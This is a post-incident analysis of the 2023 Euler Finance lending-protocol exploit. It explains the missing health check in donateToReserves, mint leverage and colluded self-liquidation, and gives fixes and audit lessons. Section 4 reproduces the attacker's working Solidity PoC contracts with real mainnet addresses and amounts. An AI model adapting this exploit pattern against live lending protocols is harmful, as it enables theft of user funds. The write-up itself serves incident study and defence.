# Euler Finance — donateToReserves Donation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-03-13 |
| **Protocol** | Euler Finance |
| **Chain** | Ethereum |
| **Loss** | $197,000,000 |
| **Attacker** | [0xb66c...7ae0](https://etherscan.io/address/0xb66cd966670d962C227B3EABA30a872DbFb995db) |
| **Attack Tx** | [0xc310...111d](https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d) |
| **Root Cause** | Unlimited debt creation without collateral via donateToReserves + mint combination, followed by self-liquidation to realize profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Euler_exp.sol) |

---

## 1. Vulnerability Overview

Euler Finance is a Compound-derived lending protocol that uses a dual-token structure consisting of eTokens (collateral tokens) and dTokens (debt tokens).

The core of this attack is a combination of two design flaws:

1. **Unlimited leverage via `mint()`**: `mint(subAccountId, amount)` allows users to simultaneously mint additional eTokens and dTokens using their own eTokens as collateral. A single call can mint up to 10x the deposited amount, forming a leveraged position.

2. **Missing health check in `donateToReserves()`**: `donateToReserves(subAccountId, amount)` is a function that donates a user's eTokens to the protocol reserve, but **it does not validate the position's health factor after the donation**. This means an attacker can intentionally create a liquidatable state by burning their own collateral through donation.

Combining these two flaws:
- Use `mint()` to create 10x debt relative to collateral → position still maintains health factor ≥ 1
- Use `donateToReserves()` to burn collateral (eTokens) → health factor drops below 1 (liquidatable state)
- A colluding liquidator contract calls `liquidate()` → acquires large amounts of collateral at a discount
- Redeem acquired eTokens via `withdraw()` for actual DAI

Using a 30 million DAI flash loan from Aave V2 as seed capital, the attacker drained approximately $197 million worth of assets through this process.

---

## 2. Vulnerable Code Analysis

### 2.1 `donateToReserves()` — Missing Health Check After Donation (Core Vulnerability)

```solidity
// ❌ Vulnerable code — Euler Finance EToken.sol (reconstructed)
function donateToReserves(uint256 subAccountId, uint256 amount) external nonReentrant {
    // Compute sub-account address
    address account = getSubAccount(msg.sender, subAccountId);

    // Burn amount from internal balance
    uint256 amountInternal = underlyingAmountToBalance(amount);
    balances[account] -= amountInternal;   // ❌ Burns user's eTokens
    reserveBalance += amountInternal;       // ❌ Adds to reserve

    // ❌ Critical flaw: position health factor is NOT validated after donation
    // Even though collateral decreased — potentially worsening the debt/collateral ratio — no check is performed
    // Missing call to checkLiquidity(account)!

    emit Donation(account, amount);
}
```

```solidity
// ✅ Fixed code — health check must be performed after donation
function donateToReserves(uint256 subAccountId, uint256 amount) external nonReentrant {
    address account = getSubAccount(msg.sender, subAccountId);

    uint256 amountInternal = underlyingAmountToBalance(amount);
    balances[account] -= amountInternal;
    reserveBalance += amountInternal;

    // ✅ Position solvency must be validated after donation
    // Since collateral decreased, health factor may drop below 1 if debt exists
    checkLiquidity(account);  // reverts if health factor < 1

    emit Donation(account, amount);
}
```

**Issue**: A user can burn eTokens (collateral) via donation, but the protocol fails to detect when the resulting debt (dTokens) exceeds the remaining collateral. The attacker exploits this to deliberately trigger a liquidatable state.

---

### 2.2 `mint()` — Leveraged Position Creation

```solidity
// ❌ Potentially vulnerable code — mint() internally performs deposit + borrow simultaneously
function mint(uint256 subAccountId, uint256 amount) external nonReentrant {
    address account = getSubAccount(msg.sender, subAccountId);

    // Simultaneously mints eTokens (collateral) and dTokens (debt) — leverage effect
    // Mint amount in eTokens (increases collateral)
    balances[account] += underlyingAmountToBalance(amount);

    // Mint amount in dTokens (increases debt)
    dToken.balances[account] += amount;

    // Health check is performed, but it can pass even after 10x leverage
    // ❌ The health check can be bypassed when combined with donateToReserves
    checkLiquidity(account);
}
```

```solidity
// ✅ Fix direction — add maximum leverage multiplier cap to mint
function mint(uint256 subAccountId, uint256 amount) external nonReentrant {
    address account = getSubAccount(msg.sender, subAccountId);

    // ✅ Verify health factor exceeds safe threshold (e.g. 1.2) after minting
    // ✅ Cap maximum leverage multiplier within a single transaction
    require(amount <= getMaxMintable(account), "Exceeds max leverage");

    balances[account] += underlyingAmountToBalance(amount);
    dToken.balances[account] += amount;
    checkLiquidity(account);
}
```

---

### 2.3 `liquidate()` — Self-Liquidation Allowed

```solidity
// ❌ Vulnerable code — no check for liquidator == violator
function liquidate(
    address violator,
    address underlying,
    address collateral,
    uint256 repay,
    uint256 minYield
) external nonReentrant {
    // ❌ liquidator (msg.sender) can be the same entity as violator
    // In practice they are different contracts, but controlled by the same attacker
    LiquidationOpportunity memory liqOpp = checkLiquidation(msg.sender, violator, underlying, collateral);

    // Liquidator acquires violator's eTokens at a discount
    // ❌ A colluding liquidator can monopolize the profit
    _transfer(collateral, violator, msg.sender, liqOpp.yield);
    _repayDebt(underlying, violator, repay);

    emit Liquidation(msg.sender, violator, repay, liqOpp.yield);
}
```

```solidity
// ✅ Fixed code — add constraints to prevent colluded liquidation
function liquidate(
    address violator,
    address underlying,
    address collateral,
    uint256 repay,
    uint256 minYield
) external nonReentrant {
    // ✅ Prevent direct self-liquidation
    require(msg.sender != violator, "Cannot self-liquidate");

    // ✅ Prevent liquidation between sub-accounts controlled by the same EOA (optional)
    require(!isSameController(msg.sender, violator), "Same controller");

    LiquidationOpportunity memory liqOpp = checkLiquidation(msg.sender, violator, underlying, collateral);
    _transfer(collateral, violator, msg.sender, liqOpp.yield);
    _repayDebt(underlying, violator, repay);

    emit Liquidation(msg.sender, violator, repay, liqOpp.yield);
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys two contracts: `Iviolator` and `Iliquidator`
- Requests a 30 million DAI flash loan from Aave V2
- All attack logic executes inside the flash loan callback (`executeOperation`)

### 3.2 Execution Phase

1. **Flash loan**: Borrow 30,000,000 DAI from Aave V2 (0.09% fee)
2. **Fund transfer**: Send 30,000,000 DAI to the Iviolator contract
3. **Initial deposit**: `eDAI.deposit(0, 20,000,000 DAI)` → deposit 20,000,000 DAI, receive ~19,568,000 eDAI
4. **First leverage mint**: `eDAI.mint(0, 200,000,000)` → create additional ~195,680,000 eDAI + 200,000,000 dDAI
5. **Partial debt repayment**: `dDAI.repay(0, 10,000,000 DAI)` → burn 10,000,000 dDAI (10,000,000 DAI remaining)
6. **Second leverage mint**: `eDAI.mint(0, 200,000,000)` → create additional ~195,680,000 eDAI + 200,000,000 dDAI
7. **Donation attack**: `eDAI.donateToReserves(0, 100,000,000 eDAI)` → burn collateral, trigger health factor < 1
8. **Self-liquidation**: `Iliquidator` calls `Euler.liquidate(violator, DAI, DAI, repay, yield)`
   - Takes on violator's ~259,000,000 dDAI debt
   - Acquires ~310,000,000 eDAI at a discount
9. **Withdrawal**: `eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol))` → withdraw ~38,900,000 DAI
10. **Flash loan repayment**: Repay 30,027,000 DAI (principal + fee)
11. **Net profit**: ~8,900,000 DAI (per single transaction; actual attack involved multiple Txs)

### 3.3 Attack Flow Diagram

```
┌──────────────────────────────────────────────────────────────┐
│                       Attacker (EOA)                         │
└───────────────────────────┬──────────────────────────────────┘
                            │ flashLoan(30M DAI)
                            ▼
┌──────────────────────────────────────────────────────────────┐
│                       Aave V2 Pool                           │
│               Provides 30,000,000 DAI flash loan             │
└───────────────────────────┬──────────────────────────────────┘
                            │ executeOperation() callback
                            ▼
┌──────────────────────────────────────────────────────────────┐
│               ContractTest (attack orchestrator)             │
│  1. Deploy Iviolator contract                                │
│  2. Deploy Iliquidator contract                              │
│  3. Transfer 30M DAI → Iviolator                             │
└──────────┬──────────────────────────────────────────────────┘
           │ call violator()
           ▼
┌──────────────────────────────────────────────────────────────┐
│                    Iviolator Contract                        │
│                                                              │
│  [Step 1] deposit(0, 20M DAI)                                │
│           └─▶ Euler: receives 20M DAI, mints 19.5M eDAI      │
│                                                              │
│  [Step 2] mint(0, 200M)       ← 1st leverage                 │
│           └─▶ Euler: mints 195.6M eDAI + 200M dDAI           │
│              (health factor: ~1.05 — not yet liquidatable)   │
│                                                              │
│  [Step 3] repay(0, 10M DAI)                                  │
│           └─▶ Euler: burns 10M dDAI                          │
│                                                              │
│  [Step 4] mint(0, 200M)       ← 2nd leverage                 │
│           └─▶ Euler: mints 195.6M eDAI + 200M dDAI           │
│                                                              │
│  [Step 5] donateToReserves(0, 100M eDAI)  ← core attack!    │
│           └─▶ Euler: burns 100M eDAI → reserve increases     │
│              ❌ No health check! Health factor << 1           │
│              → Iviolator position: liquidatable              │
└──────────────────────────────────────────────────────────────┘
           │ call liquidate()
           ▼
┌──────────────────────────────────────────────────────────────┐
│                   Iliquidator Contract                       │
│                                                              │
│  [Step 6] checkLiquidation(liquidator, violator, DAI, DAI)   │
│           └─▶ Euler: returns repay=259M dDAI, yield=310M eDAI│
│                                                              │
│  [Step 7] liquidate(violator, DAI, DAI, 259M, 310M)          │
│           └─▶ Euler: acquires 310M eDAI, assumes 259M dDAI   │
│              (liquidation discount = ~16%)                   │
│                                                              │
│  [Step 8] withdraw(0, DAI.balanceOf(Euler_Protocol))         │
│           └─▶ Euler: withdraws ~38.9M DAI                    │
│                                                              │
│  [Step 9] Transfer DAI → ContractTest                        │
└──────────────────────────────────────────────────────────────┘
           │ repay flash loan
           ▼
┌──────────────────────────────────────────────────────────────┐
│                       Aave V2 Pool                           │
│               Repaid 30,027,000 DAI (principal + fee)        │
└──────────────────────────────────────────────────────────────┘

Final Result:
  - Attacker net profit:  ~8,900,000 DAI (per single Tx)
  - Protocol loss:        ~197,000,000 USD (multiple Txs + multiple tokens)
  - Attack block:         16,817,995
```

---

## 4. PoC Code (Core Logic with English Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// === Iviolator: contract that deliberately creates a liquidatable state ===
contract Iviolator {
    IERC20 DAI  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);  // collateral token
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);  // debt token
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34); // liquidation contract
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3; // actual deposit address

    function violator() external {
        // [1] Grant unlimited DAI approval to Euler protocol
        DAI.approve(Euler_Protocol, type(uint256).max);

        // [2] Deposit 20M of the 30M DAI → receive ~19.5M eDAI
        eDAI.deposit(0, 20_000_000 * 1e18);

        // [3] Simultaneously mint 200M eDAI + 200M dDAI (1st leverage)
        // mint() internally performs deposit + borrow simultaneously
        // Health factor ≈ 1.05 → not yet liquidatable
        eDAI.mint(0, 200_000_000 * 1e18);

        // [4] Partially repay debt with remaining 10M DAI → slightly improves health factor
        dDAI.repay(0, 10_000_000 * 1e18);

        // [5] Re-mint 200M eDAI + 200M dDAI (2nd leverage)
        // Debt increases significantly again but health factor is still ≥ 1
        eDAI.mint(0, 200_000_000 * 1e18);

        // [6] Core attack: donate 100M eDAI to reserve
        // ❌ donateToReserves() does NOT validate health factor after donation!
        // Collateral (eDAI) is burned, making debt > collateral
        // → Health factor << 1 → Iviolator is now liquidatable
        eDAI.donateToReserves(0, 100_000_000 * 1e18);
    }
}

// === Iliquidator: contract that performs liquidation and captures profit ===
contract Iliquidator {
    IERC20 DAI  = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

    function liquidate(address liquidator, address violator) external {
        // [7] Query Euler for liquidation opportunity
        // → repay: amount of dDAI to repay, yield: amount of eDAI to receive (with discount)
        IEuler.LiquidationOpportunity memory returnData =
            Euler.checkLiquidation(liquidator, violator, address(DAI), address(DAI));

        // [8] Execute liquidation: take on violator's debt and acquire eDAI at a discount
        // Attacker captures extra profit equal to the discount
        Euler.liquidate(violator, address(DAI), address(DAI), returnData.repay, returnData.yield);

        // [9] Withdraw acquired eDAI as DAI
        // DAI.balanceOf(Euler_Protocol) = total DAI balance held by Euler
        eDAI.withdraw(0, DAI.balanceOf(Euler_Protocol));

        // [10] Transfer withdrawn DAI to attacker (msg.sender)
        DAI.transfer(msg.sender, DAI.balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Missing health check after donateToReserves | CRITICAL | CWE-754 (Improper Check) | `16_accounting_sync.md` Pattern 2 | Hundred Finance First Depositor |
| V-02 | Unlimited leverage via mint() | HIGH | CWE-400 (Uncontrolled Resource Consumption) | `02_flash_loan.md` | bZx Attack #1 |
| V-03 | Colluded self-liquidation allowed | HIGH | CWE-284 (Improper Access Control) | `18_liquidation.md` Pattern 1 | Venus Protocol Self-Liquidation |

---

### V-01: Missing Health Check After donateToReserves

- **Description**: The `donateToReserves()` function donates a user's eTokens to the protocol reserve. In doing so, the user's collateral decreases, but Euler does not validate the account's health factor after the donation completes. All other position-modifying functions — `deposit()`, `withdraw()`, `borrow()`, etc. — include a `checkLiquidity()` call, but it was omitted from `donateToReserves()`.
- **Impact**: An attacker can deliberately burn their collateral to drive the health factor below 1. A colluding account then acts as liquidator and acquires the collateral at a discount.
- **Attack Condition**: The attack is possible when the user holds an eToken balance alongside dToken (debt) — i.e., a leveraged position exists.

---

### V-02: Unlimited Leverage via mint()

- **Description**: The `mint()` function is a convenience feature that allows users to leverage their position. Internally it mints eTokens and dTokens simultaneously, and calls `checkLiquidity()` afterward to verify the health factor. However, a single call can achieve approximately 10x leverage relative to the deposited amount, and the `repay()` → `mint()` loop pattern can be used to dramatically scale up the position size.
- **Impact**: An attacker can create an enormous synthetic position inside the protocol with a small amount of capital. When combined with `donateToReserves()`, the entire protocol balance can be drained.
- **Attack Condition**: Initial collateral obtained via flash loan. mint-repay-mint loop executed within a single transaction.

---

### V-03: Colluded Self-Liquidation Allowed

- **Description**: Euler's `liquidate()` function does not block cases where the liquidator and the violator are both controlled by the same EOA. The attacker deploys two contracts — Iviolator and Iliquidator — where one deliberately enters a liquidatable state and the other liquidates it, monopolizing the liquidation discount.
- **Impact**: The attacker captures the entire liquidation discount (~16% in this attack). The protocol accumulates bad debt.
- **Attack Condition**: The same orchestrator controls both contracts. The violator must have entered a liquidatable state before liquidation is triggered.

---

## 6. Remediation Recommendations

### Immediate Actions

**[1] Add health check to donateToReserves** (highest priority)

```solidity
// ✅ Fix: always validate position health after donation
function donateToReserves(uint256 subAccountId, uint256 amount) external nonReentrant {
    address account = getSubAccount(msg.sender, subAccountId);
    uint256 amountInternal = underlyingAmountToBalance(amount);

    balances[account] -= amountInternal;
    reserveBalance += amountInternal;

    // ✅ Add health factor validation after donation
    // Reverts if collateral is burned from an account that carries debt
    checkLiquidity(account);

    emit Donation(account, amount);
}
```

**[2] Prevent self-liquidation**

```solidity
// ✅ Fix: block liquidation between same-controller accounts
function liquidate(
    address violator,
    address underlying,
    address collateral,
    uint256 repay,
    uint256 minYield
) external nonReentrant {
    // ✅ Block direct self-liquidation
    require(msg.sender != violator, "Cannot self-liquidate");

    // ✅ Block immediate liquidation after position creation in the same transaction (cooldown)
    require(
        block.number > lastActionBlock[violator] + LIQUIDATION_COOLDOWN,
        "Liquidation cooldown active"
    );

    // Existing liquidation logic...
}
```

**[3] Cap maximum leverage in mint()**

```solidity
// ✅ Fix: cap maximum leverage multiplier within a single transaction
function mint(uint256 subAccountId, uint256 amount) external nonReentrant {
    address account = getSubAccount(msg.sender, subAccountId);

    // ✅ Set maximum mint cap based on the account's actual collateral value
    uint256 maxMintable = getCollateralValue(account) * MAX_LEVERAGE_FACTOR / PRECISION;
    require(amount <= maxMintable, "Exceeds max leverage");

    // Existing mint logic...
    checkLiquidity(account);
}
```

---

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing health check in donateToReserves | Mandate `checkLiquidity()` calls across all position-modifying functions — add to audit checklist |
| Unlimited leverage minting | Cap the number of mint calls or total mint amount within a single transaction |
| Colluded self-liquidation | Track relationships between liquidator and violator (e.g., contracts deployed by the same EOA) or implement a staking-based liquidator whitelist |
| Flash loan-based attacks | Add detection logic for large position creation followed by immediate liquidation within the same block |
| Audit gaps | Add automated tests that verify existing invariants (health check required after every position change) when new functions are introduced |

---

## 7. Lessons Learned

1. **Every position-modifying function must perform a health check**: Any path that decreases collateral or increases debt — deposit, withdraw, borrow, repay, donate, transfer, etc. — must validate account solvency. Euler failed to recognize that `donateToReserves` was a collateral-reducing path and omitted the health check.

2. **Convenience functions (mint, donateToReserves) are breeding grounds for vulnerabilities**: Helper functions added by developers for UX may not have existing security invariants applied to them. When adding a new function, verify that every security check applied to existing functions is equally applied to the new one.

3. **Self-liquidation must be blocked at the architectural level**: Whenever a liquidation mechanism includes an incentive (discount), attackers will inevitably attempt to exploit it. The independence between liquidator and liquidatee must be enforced at the protocol level.

4. **Flash loans amplify attack scale without bound**: A $30 million flash loan led to $197 million in losses. Mechanisms are needed to detect the pattern of large position creation followed by immediate liquidation within a single transaction.

5. **Forked codebases inherit the invariants of the parent protocol**: Euler forked Compound and added numerous extensions. Unit tests and static analysis must be strengthened to ensure the original protocol's invariants (mandatory health checks) are not broken in extension functions.

6. **In code audits, "omissions" are as dangerous as "incorrect implementations"**: This vulnerability was not caused by incorrect code — it was caused by the absence of correct code. Auditors must verify not only "what should not be in this function" but also "what must be in this function."

---

## 8. On-Chain Verification

### 8.1 Attack Transaction Details

| Field | Value |
|------|-----|
| Attack Tx | [0xc310a0af...b111d](https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d) |
| Attack Block | 16,817,995 |
| Fork Block (PoC) | 16,817,995 |
| Chain | Ethereum Mainnet |

### 8.2 PoC vs On-Chain Amount Comparison

| Field | PoC Value | On-Chain Reference | Notes |
|------|--------|------------|------|
| Flash loan amount | 30,000,000 DAI | 30,000,000 DAI | Match |
| Initial deposit | 20,000,000 DAI | 20,000,000 DAI | Match |
| 1st mint | 200,000,000 | 200,000,000 | Match |
| Repay | 10,000,000 DAI | 10,000,000 DAI | Match |
| 2nd mint | 200,000,000 | 200,000,000 | Match |
| donateToReserves | 100,000,000 eDAI | 100,000,000 eDAI | Match |
| Total protocol loss | ~38.9M (single Tx) | ~197M (multiple Txs combined) | Multiple assets, multiple Txs |

### 8.3 Precondition Verification

| Condition | Status |
|------|------|
| DAI.approve(Euler_Protocol, uint256.max) | Performed inside violator() |
| Attacker DAI balance before attack | Obtained via flash loan (0 → 30M) |
| eDAI/dDAI contract deployment status | Already deployed before attack block |
| Euler_Protocol address | 0x27182842E098f60e3D576794A5bFFb0777E025d3 (verified) |

> **Note**: The actual attack spanned multiple transactions and multiple assets (DAI, WBTC, USDC, stETH, etc.), with total losses tallied at approximately $197 million. The attacker subsequently negotiated with the Euler team and returned the majority of funds in April 2023.

---

*Analysis written: 2026-04-11*
*References: [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Euler_exp.sol) | [FrankResearcher Analysis](https://twitter.com/FrankResearcher/status/1635241475989721089) | [BlockSec Analysis](https://twitter.com/BlockSecTeam/status/1635262150624305153)*